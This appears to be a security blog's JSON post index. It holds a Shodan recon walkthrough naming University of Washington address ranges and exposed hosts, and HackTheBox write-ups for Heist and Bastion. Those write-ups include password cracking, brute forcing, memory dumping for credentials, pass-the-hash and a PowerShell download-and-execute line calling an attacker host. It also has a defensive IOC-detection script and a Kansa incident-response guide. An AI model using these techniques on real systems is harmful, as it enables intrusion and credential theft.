[ { "title": "Shodan CLi - Python", "url": "/posts/ShodanCLI/", "categories": "recon", "tags": "automation", "date": "2022-12-27 00:00:00 -0800", "snippet": "Pre-work:sudo apt-get updatesudo apt-get upgradesudo apt-get install python-setuptoolssudo apt-get install python2.7sudo apt-get install python-pipsudo pip install shodanCode:Shodan Searchimport shodanSHODAN_API_KEY = &quot;putyourownapikeyhereFROMSHODANwebsite&quot;api = shodan.Shodan(SHODAN_API_KEY)try: #search Shodan results = api.search(&#39;net:69.91.192.0/24,69.91.193.0/24,69.91.194.0/24,69.91.195.0/24,69.91.196.0/24,69.91.197.0/24,69.91.198.0/24,69.91.199.0/24,69.91.200.0/24,69.91.201.0/24,69.91.202.0/24,69.91.203.0/24,69.91.204.0/24&#39;) #show the results #print &#39;Results found:%s % results&#39;total&#39; for result in results[&#39;matches&#39;]: print &#39;%s&#39; % result[&#39;ip_str&#39;] #print result&#39;data&#39; #print &#39;&#39;except shodan.APIError, e: print &#39;Error: %s&#39; % eUse Shodan CLI:```root@kali:~/shodan# shodan init Successfully initializedroot@kali:~/shodan# shodan download --limit 400 uwbPublic net:69.91.192.0/24,69.91.193.0/24,69.91.194.0/24,69.91.195.0/24,69.91.196.0/24,69.91.197.0/24,69.91.198.0/24,69.91.199.0/24,69.91.200.0/24,69.91.201.0/24,69.91.202.0/24,69.91.203.0/24,69.91.204.0/24Search query: net:69.91.192.0/24,69.91.193.0/24,69.91.194.0/24,69.91.195.0/24,69.91.196.0/24,69.91.197.0/24,69.91.198.0/24,69.91.199.0/24,69.91.200.0/24,69.91.201.0/24,69.91.202.0/24,69.91.203.0/24,69.91.204.0/24Total number of results: 224Query credits left: 199998Output file: COMPPublic.json.gz[###################################-] 99% 00:00:02Saved 224 results into file COMPPublic.json.gzroot@kali:~/shodan#```root@kali:~/shodan# shodan download --limit 400 UWB2 net:69.91.205.0/24,69.91.206.0/24,128.208.24.128/25,128.208.50.0/24,128.208.52.0/25,128.208.255.0/24,140.142.14.192/27,140.142.24.192/26,140.142.26.192/26,140.142.158.0/24,140.142.164.0/24Search query: net:69.91.205.0/24,69.91.206.0/24,128.208.24.128/25,128.208.50.0/24,128.208.52.0/25,128.208.255.0/24,140.142.14.192/27,140.142.24.192/26,140.142.26.192/26,140.142.158.0/24,140.142.164.0/24Total number of results: 49Query credits left: 199996Output file: UWB2.json.gz [###################################-] 97% 00:00:01Saved 49 results into file uw2.json.gzroot@kali:~/shodan# lsShodan CLI using ticks for hostname```root@kali:~/shodan# shodan download –limit 400 HostnameUWB ‘hostname:uwb org:”University of Washington” org:”University of Washington”’Search query: hostname:uwb org:”University of Washington” org:”University of Washington”Total number of results: 108Query credits left: 199994Output file: HostnameUWB.json.gz [###################################-] 99% 00:00:01Saved 108 results into file HostnameUWB.json.gzroot@kali:~/shodan#Shodan CLI to Parse:```root@kali:~/shodan# shodan parse --fields ip_str,port --separator , uwbPublic.json.gz69.91.197.32,328369.91.197.18,328369.91.193.117,50069.91.202.11,328369.91.195.3,3283root@kali:~/shodan# shodan parse --fields ip_str,port,product,org,os --separator , UWB1.json.gz69.91.197.32,3283,Apple Remote Desktop,University of Washington,69.91.197.18,3283,Apple Remote Desktop,University of Washington,69.91.193.117,500,Microsoft,University of Washington,Windows 8Shodan Host:See information about the host such as where it’s located, what ports are open and which organization owns the IP.```root@kali:~/shodan# shodan host 69.91.197.3269.91.197.32Hostnames: MAC-30239442.uwb.eduCity: KenmoreCountry: United StatesOrganization: University of WashingtonUpdated: 2019-12-11T20:20:48.380125Number of open ports: 1Ports: 3283/udp Apple Remote Desktoproot@kali:~/shodan#Shodan Searchroot@kali:~/shodan# shodan search –fields ip_str,port,hostname,org,os,product net:69.91.192.0/24,69.91.193.0/24,69.91.194.0/24,69.91.195.0/24,69.91.196.0/24,69.91.197.0/24,69.91.198.0/24,69.91.199.0/24,69.91.200.0/24,69.91.201.0/24,69.91.202.0/24,69.91.203.0/24,69.91.204.0/2469.91.197.32 3283 University of Washington Apple Remote Desktop 69.91.197.18 3283 University of Washington Apple Remote Desktop 69.91.193.117 500 University of Washington Windows 8 Microsoft 69.91.202.11 3283 University of Washington Apple Remote Desktop 69.91.195.3 3283 University of Washington Apple Remote Desktop 69.91.203.37 3283 University of Washington Apple Remote Desktop 69.91.197.56 80 University of WashingtonExtra Search Greproot@kali:~/shodan# shodan parse –fields ip_str,port,product,os –separator , UWB1.json.gz | grep “Windows 8”```" }, { "title": "HackTheBox - Heist", "url": "/posts/HTB-Heist/", "categories": "Hackthebox", "tags": "hacking, windows", "date": "2020-05-15 20:33:00 -0700", "snippet": "10.10.10.149root@kali:~/htb/heist# gedit /etc/hostsnmap -sS -sV -A -O -p- 10.10.10.149nmap -vv 10.10.10.149We find IIS running on port 80, MSRPC on port 135 and SMB on 445. Additionally, port 5985WebsiteLogin as GuestCisco router attachment:hostname ios-1! security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91! username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408Type 5 password can be cracked:https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html$1$pdQG$o8nrSzsGXeaduXrjlvKc91 ‘Additional cisco resources:https://github.com/axcheron/cisco_pwdecryptThis cracks instantly using MSFT Edge browser (Firefox in Kali doesn’t work).type 7 cisco passwordusername rout3r password 7 0242114B0E143F015F5D1E161713https://www.ifm.net.nz/cookbooks/passwordcracker.html\\0242114B0E143F015F5D1E161713$uperP@sswordhttps://www.ifm.net.nz/cookbooks/passwordcracker.html02375012182C1A1D751618034F36415408Q4)sJu\\Y8qz*A3?dcrack type 5 with johnecho ‘$1$pdQG$o8nrSzsGXeaduXrjlvKc91’ &amp;gt; cisco5hashjohn –fork=4 -w=rockyou.txt cisco5hashstealth1agentEnumerating website provides users:HazardSupport Adminrout3radminPut them into user fileroot@kali:~/htb/heist# gedit user.txtUse password from ciscopasswordcrackstealth1agent$uperP@sswordroot@kali:~/htb/heist# gedit passwords.txtuse CrackMapExecv5.0.2dev to bruteforcehttps://github.com/byt3bl33d3r/CrackMapExec/releases/tag/v5.0.2devpython3 cme smb 10.10.10.149 -u user.txt -p passwords.txtSupportDesk\\Hazard:stealth1agentWinRm login?python3 cme winrm 10.10.10.149 -u Hazard -p stealth1agentIsn’t in Remote Management Users groupRid-brute forcepython3 cme smb 10.10.10.149 -u Hazard -p stealth1agent –rid-bruteAdd the additional usersChaseJasonpython3 cme smb 10.10.10.149 -u user.txt -p passwords.txtI missed one of the cisco type7 passwords, so I added it:Q4)sJu\\Y8qz*A3?dpython3 cme smb 10.10.10.149 -u user.txt -p passwords.txtChaseQ4)sJu\\Y8qz*A3?dWinRm?python3 cme winrm 10.10.10.149 -u Chase -p Q4)sJu\\Y8qz*A3?dgit clone https://github.com/Hackplayers/evil-winrmgem install evil-winrmruby evil-winrm.rb -i 10.10.10.149 -u Chase -p ‘Q4)sJu\\Y8qz*A3?d’a127daef77ab6d9d92008653295f59c4Privescget-process -name firefoxdownload procdump-ma flag to dump the entire memory of process.\\procdump.exe -maget-process -name firefoxPID is Id3004.\\procdump.exe -ma 3004 firefox.dmpFirst time running procdump needs -accepteula flagEvil-WinRM PS C:\\Users\\Chase\\Desktop&amp;gt; .\\procdump.exe -accepteula -ma 3004 firefox.dmpSMB server to transfer fileroot@kali:~/htb/heist# smbserver.py -smb2support -username jesse -password jesse2 share /root/htb/heist/need to be in Impacket folderlocate smbserver.pycd /usr/share/doc/python3-impacket/examples/root@kali:/usr/share/doc/python3-impacket/examples# python3 smbserver.py -smb2support -username jesse -password jesse2 share /root/htb/heist/Screw it, can’t get this to work, so I will use Evil-WinRM:https://docs.microsoft.com/en-us/sysinternals/downloads/stringsupload strings Evil-WinRM* PS C:\\Users\\Chase\\Desktop&amp;gt; ./strings.exe -a firefox.dmp findstr login_password &amp;gt; what.txt This didn’t work above….so atfter a long upload from WinRM….localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=4dD!5}x/re8]FBuZropnop staticbinaryhttps://github.com/ropnop/impacket_static_binariesroot@kali:~/htb/heist# curl -s -o smbserver_linux -L https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.19-dev-binaries/smbserver_linux_x86_64root@kali:~/htb/heist#chmod +x smbserver_linuxroot@kali:~/htb/heist#./smbserver_linux -smb2support -username guest -password guest share2 ~/htb/heist/Evil-WinRM PS C:\\Users\\Chase\\Desktop&amp;gt; net use x: \\10.10.14.10\\share2 /user:guest guestcmd /c copy firefox.dmp X:\\PSEXECpsexec.py ‘administrator:4dD!5}x/re8]FBuZ@10.10.10.149’50dfa3c6bfd20e2e0d071b073d766897" }, { "title": "2020-02-HTB-Bastion", "url": "/posts/HTB-Bastion/", "categories": "HackTheBox", "tags": "hacking, Windows, HTB", "date": "2020-02-06 17:26:00 -0800", "snippet": "10.10.10.134ippsec.rocks/?#locathttps://www.hackthebox.eu/home/machines/profile/186https://overflow.uaacyber.dev/2019/09/bastion.htmlhttps://0xrick.github.io/hack-the-box/bastion/https://github.com/kmahyyg/mremoteng-decrypthttps://www.elasticice.net/?p=255nmap -sV -sC -oA nmap/Bastion 10.10.10.134Scan the host as anonymous for open smb shares using SMBMap. Install SMBMappython3 -m pip install -r requirements.txtList Shares that have no password:smbclient –list //bastion.htb/ -U ‘Looks like Backups is the only Comment that doesn’t say we cant accesssmbclient //10.10.10.134/Backups -Upress l to listSo we need to mount the VHD in the other directorycd BackupSee the VHDMount Backupsmount -t cifs //10.10.10.134/Backups /mnt/smbcat note.txtuse &amp;amp;zip if you want to see files… however we will just mount the vhd using guestmount7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd####################################mkdir /mnt/vhd2guestmount –add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd –inspector –ro -v /mnt/vhd2to mount a VHD you need this:apt install libguestfs-toolsCreate a mount directory to use for the mountmkdir /mnt/vhd2Use guestmount to mount the VHDguestmount –add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd –inspector –ro -v /mnt/vhd2Find files in these directoriesfind Desktop Documents/ Downloads/ -lsGo into vhd2 and navigate to config in Windows to obtain SAM and SYSTEM filescp SAM SYSTEM /root/htb/bastioncd /root/htb/bastionmkdir backup-dumpmv SAM SYSTEM backup-dump/cd backup-dump/root@kali:~/htb/bastion/backup-dump# impacket-secretsdump -sam SAM -system SYSTEM localAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::NOTICE the Administrator NT HASH is BLANK aka 31d6c and the LM hash of aad3, which means the Administrative account is disabled.try to crack the L4mpje hash 26112010952d963c8dc4217daec986d9https://crackstation.net/bureaulampjeOR pass the hashsmbmap -u L4mpje -p ad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134ssh L4mpje@10.10.10.134bureaulampjenet localgroup administratorsnet user l4mpjenet user administratornow that you see administrator has logged in… time to Priv EscGrab from KaliJAWS Enumeration powershell githubgit clone https://github.com/411Hall/JAWS.gitOn TARGET:powershellIEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.14:8000/jaws-enum.ps1’)In ANOTHER Windowsroot@kali:~/htb/bastion# echo l4mpje:bureaulampje &amp;gt; credsroot@kali:~/htb/bastion# lsbackup-dump creds JAWS mountstuf nmap smbmaproot@kali:~/htb/bastion# cat credsl4mpje:bureaulampjeroot@kali:~/htb/bastion# ssh l4mpje@10.10.10.134type C:\\Users\\L4mpje\\Desktop\\user.txtPS C:\\Users\\L4mpje&amp;gt; type C:\\Users\\L4mpje\\Desktop\\user.txt 9bfe57d5c3309db3a151772f9d86c6cdgit clone https://github.com/411Hall/JAWS.gitpython -m SimpleHTTPServerOn the TARGET:powershellIEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.14:8000/jaws-enum.ps1’)Looking through the JAWS output we see a programx86 as mRemoteNGAfter manually enumerating installed programs mRemoteNG stands out of interest. Tool is used to remotely access server resources and is suggested to store credentials in an insecure manner. Credentials for application noted as being stored in file confCons.xml. Copy of the confCons.xml file obtained from %USER%/AppData/Roaming/mremoteng/confCons.xmland reviewed.Two items of interest found from reviewing file are below. File appears to store RDP credentialsfor user Administrator and L4mpje.Download decrypt python toolhttps://github.com/kmahyyg/mremoteng-decryptDownload the mRemotNG confCons.xml from targetscp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .cat confCons.xml | grep PasswordUsername=Administrator Domain= Password=aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw== Hostname=127.0.0.1 Protocol=RDProot@kali:~/htb/bastion/mremoteng-decrypt# python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==Password: thXLHM96BeKL0ER2Now SSH with that password as Administratorssh administrator@10.10.10.134administrator@BASTION C:\\Users\\Administrator\\Desktop&amp;gt;type root.txt 958850b91811676ed6620a9c430e65c8" }, { "title": "US-CERT AKA CISA Alert-TA18-074A-Detection", "url": "/posts/US-CERT-TA18-074A-Detection/", "categories": "detection", "tags": "", "date": "2019-02-04 19:17:00 -0800", "snippet": "This is a script to find ioc from US-CERT alert.&amp;lt;#.SYNOPSISGet-US-CERT-TA18-074A.ps1 returns data about US-CERT Alert. https://www.us-cert.gov/ncas/alerts/TA18-074A.NOTESThe next line is needed by Kansa.ps1 to determine how to handle outputfrom this script.OUTPUT TSV Contributed by Jesse Moore#&amp;gt;Write-Host &quot;*****PowerShell_Version******&quot;;$PSVersionTable.PSVersion.Major#Find OS VersionWrite-Host &quot;*****Find OS Version 6? aka 7. or 10?******&quot;Write-Host &quot;*****Find OS Version 6? aka 7. or 10?******&quot;(Get-WmiObject -class Win32_OperatingSystem).Caption(Get-CimInstance Win32_OperatingSystem).version Start-Sleep -Second 2Write-Host &quot;*****fDenyTSConnections******&quot; ;Get-ItemPropertyValue &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&#39; fDenyTSConnections #Checks for TRUE (1) deny connections, #/t REG_DWORD /d 0 /fWrite-Host &quot;*****NotificationPackages******&quot; ;Get-ItemPropertyValue &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa&#39; &#39;Notification Packages&#39; #checks for unsigned DLLs for passwordFilter Start-Sleep -Second 2write-host &quot;*****CachedLogonsCount******&quot; ;Get-ItemPropertyValue &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&#39; -Name &#39;CachedLogonsCount&#39; Start-Sleep -Second 2Write-Host &quot;*****FSingleSessionPerUser******&quot; ;Get-ItemPropertyValue &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&#39; fSingleSessionPerUser #/t REG_DWORD /d 0 /f Start-Sleep -Seconds 2Write-Host &quot;*****ExecutionPolicy******&quot; ;Get-ItemPropertyValue &#39;HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell\\&#39; -Name ExecutionPolicy Start-Sleep -Seconds 2#Looking for just the presence of this Key name belowWrite-host &quot;*****Looking for just the presence of this key name******&quot;Write-host &quot;*****Looking for just the presence of this key name******&quot;Start-Sleep -Seconds 2Write-Host &quot;*****StandardProfile_OpenPorts?******&quot;Get-ItemProperty &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List&#39; -erroraction &#39;silentlycontinue&#39; #/v 3389:TCP /t REG_SZ /d &quot;3389:TCP:*:Enabled:Remote Desktop&quot; /f Start-Sleep -Seconds 2Write-Host &quot;*****DomainProfile_OpenPort?******&quot;Get-ItemProperty &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List&#39; -erroraction &#39;silentlycontinue&#39;#/v 3389:TCP /t REG_SZ /d &quot;3389:TCP:*:Enabled:Remote Desktop&quot; /f Start-Sleep -Seconds 2Write-Host &quot;*****EnabledConcurrentSessions******&quot;Get-ItemProperty &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core&#39; -Name EnableConcurrentSessions -erroraction &#39;silentlycontinue&#39; #/t REG_DWORD /d 1 /fStart-Sleep -Seconds 2Write-Host &quot;*****WinLogonEnabledConcurrentSessions******&quot; Start-Sleep -Seconds 2#Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&#39; -Name EnableConcurrentSessions -erroraction &#39;silentlycontinue&#39; #/t REG_DWORD /d 1 /f#Write-Host &quot;*****WinLogonAllowMultipleTSSessions******&quot;Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&#39; -Name AllowMultipleTSSessions -erroraction &#39;silentlycontinue&#39;# /t REG_DWORD /d 1 /f# Start-Sleep -Seconds 2#Write-Host &quot;*****TerminalServcsMaxInstanceCount******&quot;Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services&#39; -Name MaxInstanceCount -erroraction &#39;silentlycontinue&#39;#/t REG_DWORD /d 100 /f# Start-Sleep -Seconds 2##Only Win10 SpecialAccountsWrite-Host &quot;*****WinLogonSpecialAccounts Win10+******&quot;Write-Host &quot;*****WinLogonSpecialAccounts Win10+******&quot;Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList&#39; -erroraction silentlycontinue #/v MS_BACKUP /t REG_DWORD /d 0 /f ONLYWIN10# Start-Sleep -Seconds 2#Write-Host &quot;*****DontDisplayLastUsername******&quot; ;Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system&#39; | Select-Object -Property dontdisplaylastusername -erroraction silentlycontinue # /t REG_DWORD /d 1 /f Start-Sleep -Seconds 2Write-Host &quot;*****LocalAccountTokenFilterPolicy******&quot; ;Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system&#39; | Select-Object -Property LocalAccountTokenFilterPolicy -erroraction silentlycontinue # /t REG_DWORD /d 1 /f Start-Sleep -Seconds 2Write-Host &quot;*****LocalAccountTokenFilterPolicy******&quot; ;Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system&#39; | Select-Object -Property legalnoticetext -erroraction silentlycontinue Start-Sleep -Seconds 2##Find OS versionWrite-Host &quot;*****Find OS Version 6? aka 7. or 10?******&quot;(Get-CimInstance Win32_OperatingSystem).version#Find SMBv1 enabled#Write-Host &quot;*****SMBv1 Enbaled******&quot;#Write-Host &quot;*****SMBv1 Enbaled******&quot;Get-Item HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters | ForEach-Object {Get-ItemProperty $_.pspath}#Get-WindowsOptionalFeature –Online –FeatureName SMB1Protocol | Where-Object {$_.State -contains &#39;Enabled&#39;} -erroraction silentlycontinue#Start-Sleep -Seconds 2Write-Host &quot;*****SMBv1 Reg Key******&quot;reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters#Start-Sleep -Seconds 2#Only WIN10 find DNSClient#reg query &quot;HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient&quot; | cmd#reg query &quot;HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient&quot; Start-Sleep -Seconds 2#Find services runningWrite-Host &quot;*****Services Running******&quot;Get-Service | Where-Object -Property Status -eq -Value &#39;running&#39; Start-Sleep -Seconds 5##Find last write time on fileWrite-Host &quot;*****LastWriteTime******&quot; ;Get-ItemPropertyValue -Path &#39;C:\\Users\\%UserProfile%\\Desktop\\putty.exe&#39; -Name LastWriteTime,CreationTime -erroraction &#39;silentlycontinue&#39;#LocalUsers to see if added backdoor userWrite-Host &quot;*****LocalUser******&quot;Get-LocalUser Start-Sleep -Seconds 5Write-Host &quot;*****LocalAdmin******&quot;Get-LocalUser Administrator -erroraction silentlycontinue Start-Sleep -Seconds 2Write-Host &quot;*****LocalMS_BACKUP******&quot;Get-LocalUser MS_BACKUP -erroraction silentlycontinue Start-Sleep -Seconds 2Write-Host &quot;*****Guest renamed******&quot;Get-LocalUser CISGUEST -erroraction silentlycontinue Start-Sleep -Seconds 2Write-Host &quot;*****LocalUser ADMIN Renamed******&quot;Get-LocalUser CISADMIN -erroraction silentlycontinue Start-Sleep -Seconds 2Write-Host &quot;*****LocalGroup Administrators******&quot;Get-LocalGroupMember Administrators -erroraction silentlycontinue Start-Sleep -Seconds 2Write-Host &quot;*****LocalGroup RDUsers******&quot;Get-LocalGroupMember &quot;Remote Desktop Users&quot; -erroraction silentlycontinue Start-Sleep -Seconds 2Write-Host &quot;*****LocalGroupMember Guest******&quot;Get-LocalGroupMember Guests -erroraction silentlycontinue Start-Sleep -Seconds 2##Find service descriptions with CMD.EXEWrite-Host &quot;*****show securtiy descriptions******&quot;Write-Host &quot;*****show securtiy descriptions******&quot; Start-Sleep -Seconds 3&quot;sc sdshow termservice&quot; | cmdWrite-Host &quot;*****SC qc termserv for StartType Auto******&quot;Write-Host &quot;*****SC qc termserv for StartType Auto******&quot; Start-Sleep -Seconds 2&quot;sc qc termservice&quot; | cmd #looking for auto in START_TYPE##Find Services runningWrite-Host &quot;*****Find Service running termservice******&quot; ;Get-Service termservice | Where-Object {$_.Status -contains &#39;Running&#39;}# Start-Sleep -Seconds 5# What service that is running has StartMode equal to autoWrite-Host &quot;*****Services running in StartMode******&quot; ;Get-WmiObject -Class Win32_SystemDriver | Where-Object -FilterScript {$_.State -eq &quot;Running&quot;} | Where-Object -FilterScript {$_.StartMode -eq &quot;Auto&quot;}# Start-Sleep -Seconds 5#Only Windows10 FirewallWrite-Host &quot;*****Checking Firewall_Profile WIN10******&quot; ;Get-NetFirewallProfile##Find firewall on or off for older Windows#Reg Query &#39;HKEY_LOCAL_MACHINE:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccessParametersFirewallPolicyStandardProfile&#39;#Write-Host &quot;*****Find Windows Defender Exclusions path******&quot;Write-Host &quot;*****Find Windows Defender Exclusions path******&quot; Start-Sleep -Seconds 3Get-ItemProperty &#39;HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths&#39; -erroraction silentlycontinue# Start-Sleep -Seconds 5#Find the Alternate data stream (desktop.ini)#cd %UserProfile%\\Desktop; Get-Item -Stream * *.txt#cd c:\\Users\\moorej1; Get-Item -Stream * *.txt##Find if wdigest is turned on (1) Plaintext creds in Memory#reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest&quot; /v UseLogonCredentialWrite-Host &quot;*****Wdigest useLogonCreds******&quot;Get-ItemProperty &#39;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest&#39;UseLogonCredential -ErrorAction SilentlyContinue#Write-Host &quot;*****Find Files with CMD.EXE*****&quot;Write-Host &quot;*****Find Files with CMD.EXE*****&quot; Start-Sleep -Seconds 3#&quot;dir /b /s C:\\IPS_*.txt 2&amp;gt; nul&quot; | cmd&quot;dir /b /s C:\\comp*.txt 2&amp;gt; nul&quot; | cmd Start-Sleep -Second 3&quot;dir /b /s C:\\adm*.txt 2&amp;gt; nul&quot; | cmd Start-Sleep -Second 3 &quot;dir /b /s C:\\con*.txt 2&amp;gt; nul&quot; | cmd Start-Sleep -Second 3&quot;dir /b /s C:\\dom*.txt 2&amp;gt; nul&quot; | cmd Start-Sleep -Second 3&quot;dir /b /s C:\\enum*.txt 2&amp;gt; nul&quot; | cmd Start-Sleep -Second 3&quot;dir /b /s C:\\user*.txt 2&amp;gt; nul&quot; | cmd Start-Sleep -Second 3#Find Desktop Shortcuts that might be mal (aka the notepad.exe.lnk, Document.lnk, and desktop.ini.lnk, and SETROUTE.lnk#cd %UserProfile%\\Desktop; Get-Item -Stream * *.lnk &amp;lt;--This only works through cmd.exe, otherwise it wont change directoriesWrite-Host &quot;*****Find .LNK files***** Win10+&quot;Write-Host &quot;*****Find .LNK files Win10+*****&quot; Start-Sleep -Seconds 3Get-Item -Stream * *.lnk -ErrorAction SilentlyContinue # This works in the Regular PS cmd prompt in C:\\Users\\moorej1\\Desktop Start-sleep -Seconds 3#cd $HOME; Get-Item -Stream * *.lnk -ErrorAction SilentlyContinue##Find Tools Hydra, SecretsDump, and CrackMapExec## Start-Sleep -Seconds 3Write-Host &quot;*****See ScheduledTasks running Win10+*****&quot;Write-Host &quot;*****See ScheduledTasks running Win10+*****&quot; Start-Sleep -Seconds 3schtasks /query#Start-Sleep -Seconds 3#Get-ScheduledTask -ErrorAction SilentlyContinue#Get-ScheduledTask -Recurse | Where-Object { $_.Name -like &quot;*Task*&quot;}##Get sysinternals infoWrite-Host &quot;*****Look for SysInternals such as PSEXEC*****&quot; Start-Sleep -Seconds 2reg query HKCU\\SOFTWARE\\Sysinternals 2&amp;gt; null# Start-Sleep -Seconds 2Write-Host &quot;*****New-EventLog written about Kansa Win10+*****&quot;Write-Host &quot;*****New-EventLog written about Kansa Win10+*****&quot; Start-Sleep -Second 2New-EventLog -LogName Application -Source &quot;Kansa&quot; -ErrorAction SilentlyContinue Start-Sleep -Seconds 2Write-EventLog -LogName Application -Source &quot;Kansa&quot; -EntryType Information -EventId 7777 -Message &quot;This is Kansa completing a Security Check.&quot; Start-Sleep -Second 2#Eventcreate.exe /L Application -SO &quot;Security-Team&quot; /T Information /ID 1 /D &quot;This is Kansa completing a Security Check.&quot;Write-Host &quot;*****END OF PowerShell Script******&quot;Write-Host &quot;*****END OF PowerShell Script******&quot;Write-Host &quot;*****END OF PowerShell Script******&quot;Write-Host &quot;*****END OF PowerShell Script******&quot;" }, { "title": "Kansa -How to Get-Started", "url": "/posts/Kansa-PowerShell-Part1/", "categories": "Blue-Teaming", "tags": "active-directory, detection, incident response", "date": "2018-11-20 18:00:00 -0800", "snippet": "IntroductionThis is a place to keep my notes on various projects so I don’t forget.If not so, you can give it a read from here.This guide aims to provide a starting place for Kansa PowerShell in an Active Directory network. You may refer to this as a Cheat-Sheet also.This article will not contain everything you need to know about PowerShell. The following topics will be covered in a later article.I will cover the following topics under this guide: Install Kansa for one host Usage example Running Modules standalone Throughout the article, I will use Kansa PowerShell, to show how to retrieve information from Active Directory joined machines.This article has been created with references from a few other articlesAll used references for completing this article will be listed below.Installation of KansaWhat is Kansa &amp;amp; PowershellA modular incident response framework in Powershell.This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object oriented.PreREQS:Run the below on all Windows machines you need to remotely access (So all Windows machines you want Kansa to grab info from).Enable-PSRemoting -ForceSet-Item wsman:\\localhost\\client\\trustedhosts *https://pastebin.com/ve4pPvV3Check the Remote PowerShell with these commandsNew-PSSession -ComputerName WIN-AD -Credential campus\\AdministratorGet-PSSESSIONhttps://pastebin.com/XJRwvNNCDownload InstallDownload latest build from githubhttps://github.com/davehull/Kansaunzip it, and “unblock” the ps1 files.The easiest way to do this if you’re using Powershell v3 or later is to cd to the directory where Kansa resides and do:Unblock-Filels -r *.ps1 | Unblock-FileEnsure that you check your execution policies with PowerShell:Set-ExecutionPolicy AllSigned | RemoteSigned | UnrestricedUsage exampleOpen an elevated Powershell Prompt (Right-click Run As Administrator)At the command prompt, enter:.kansa.ps1 -Target $env:COMPUTERNAME -ModulePath .Modules -VerboseThe script should start collecting data or you may see an error aboutnot having Windows Remote Management enabled.When it finishes running, you’ll have a new Output_timestamp subdirectory, with subdirectories for data collected by each module.Test WIN-ADPS C:\\Tools\\Kansa-master&amp;gt; .\\kansa.ps1 -Pushbin -Target WIN-AD -Credential chi.local\\administrator -Authentication Negotiate VERBOSE: Found Modules\\\\Modules.conf. VERBOSE: Running modules: Get-PrefetchListing Get-Netstat Get-DNSCache Get-SmbSession Get-LogWinEvent Get-SchedTasks Get-LocalAdmins Get-Hotfix VERBOSE: Waiting for Get-PrefetchListing to complete. Id Name PSJobTypeName State HasMoreData Location Command -- ---- ------------- ----- ----------- -------- ------- 1 Job1 RemoteJob Completed True WIN-AD &amp;lt;#... VERBOSE: Waiting for Get-Netstat to complete. 3 Job3 RemoteJob Completed True WIN-AD &amp;lt;#... VERBOSE: Waiting for Get-DNSCache to complete. 5 Job5 RemoteJob Completed True WIN-AD &amp;lt;#... VERBOSE: Waiting for Get-SmbSession to complete. 7 Job7 RemoteJob Completed True WIN-AD &amp;lt;#... VERBOSE: Waiting for Get-LogWinEvent Security to complete. 9 Job9 RemoteJob Completed True WIN-AD &amp;lt;# ... VERBOSE: Waiting for Get-SchedTasks to complete. 11 Job11 RemoteJob Completed True WIN-AD &amp;lt;#... VERBOSE: Waiting for Get-LocalAdmins to complete. 13 Job13 RemoteJob Completed True WIN-AD &amp;lt;#... VERBOSE: Waiting for Get-Hotfix to complete. 15 Job15 RemoteJob Completed True WIN-AD &amp;lt;#... PS 